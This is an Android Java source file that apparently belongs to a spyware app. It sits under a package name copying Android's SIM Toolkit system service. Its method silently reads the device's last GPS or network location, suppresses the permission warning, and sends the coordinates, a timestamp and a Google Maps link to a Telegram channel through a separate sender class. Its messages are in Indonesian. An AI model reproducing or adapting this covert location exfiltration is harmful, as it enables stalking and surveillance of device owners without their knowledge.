package com.android.stk.service;

import android.annotation.SuppressLint;
import android.content.Context;
import android.location.Location;
import android.location.LocationManager;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class LocationHelper {

    @SuppressLint("MissingPermission")
    public static void sendCurrentLocation(Context context) {
        try {
            LocationManager lm = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
            if (lm == null) {
                TelegramSender.sendText("❌ LocationManager tidak tersedia.");
                return;
            }

            // Coba ambil lokasi dari GPS
            Location location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);

            // Kalau gagal, coba dari NETWORK
            if (location == null) {
                location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            }

            if (location != null) {
                double lat = location.getLatitude();
                double lon = location.getLongitude();

                String link = "https://maps.google.com/?q=" + lat + "," + lon;
                String time = new SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault()).format(new Date());

                String message = "📍 Lokasi Saat Ini\n"
                        + "🕒 " + time + "\n"
                        + "📌 Koordinat: " + lat + ", " + lon + "\n"
                        + "🌐 Link: " + link;

                TelegramSender.sendText(message);
            } else {
                TelegramSender.sendText("⚠️ Gagal mendapatkan lokasi.");
            }

        } catch (Exception e) {
            TelegramSender.sendText("❌ Error lokasi: " + e.getMessage());
        }
    }
}
